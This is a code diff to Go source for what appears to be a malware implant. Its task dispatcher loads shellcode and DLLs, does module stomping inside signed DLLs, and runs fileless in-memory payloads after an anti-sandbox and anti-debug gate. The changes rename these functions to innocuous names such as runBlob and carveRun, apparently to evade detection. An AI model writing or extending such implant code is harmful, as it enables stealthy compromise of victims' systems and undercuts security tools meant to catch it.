@@ -290,7 +290,7 @@ func main() {
 	}
 
 	// 反沙箱/反调试：命中可疑环境时延迟执行（Windows 下有效，其它平台为空操作）
-	evasionInit()
+	initGate()
 
 	// 编译时内嵌的默认值（由 processTemplates 替换）
 	serverAddr = "{{SERVER_URL}}"
@@ -1612,10 +1612,10 @@ func executeTask(task Task) Result {
 	case "plugin_dll":
 		output, exitCode, errMsg = loadDLL(task.Data)
 	case "plugin_shellcode":
-		output, exitCode, errMsg = loadShellcode(task.Data)
+		output, exitCode, errMsg = runBlob(task.Data)
 	case "module_stomp":
 		// 模块伪造：shellcode 驻留已签名 DLL .text 空洞后执行（内存隐匿 2.0）
-		output, exitCode, errMsg = stompShellcode(task.Data)
+		output, exitCode, errMsg = carveRun(task.Data)
 	case "fileless_exec":
 		// 全内存无文件执行：shellcode / BOF / DLL 三类载荷均不落盘执行
 		output, exitCode, errMsg = handleFilelessExec(task.Data)
@@ -1743,13 +1743,13 @@ func handleFilelessExec(data string) (string, int32, string) {
 
 	switch req.Kind {
 	case "shellcode", "":
-		return loadShellcode(req.PayloadB64)
+		return runBlob(req.PayloadB64)
 	case "bof":
 		return loadBOF(req.PayloadB64, req.Args)
 	case "dll":
 		return loadDLLMem(req.PayloadB64, req.Entry)
 	case "exe_mem":
-		return loadEXEMem(req.PayloadB64, req.Args, req.Entry, req.WaitMs)
+		return runMappedImage(req.PayloadB64, req.Args, req.Entry, req.WaitMs)
 	default:
 		return "", -1, fmt.Sprintf("unsupported fileless kind: %q", req.Kind)
 	}
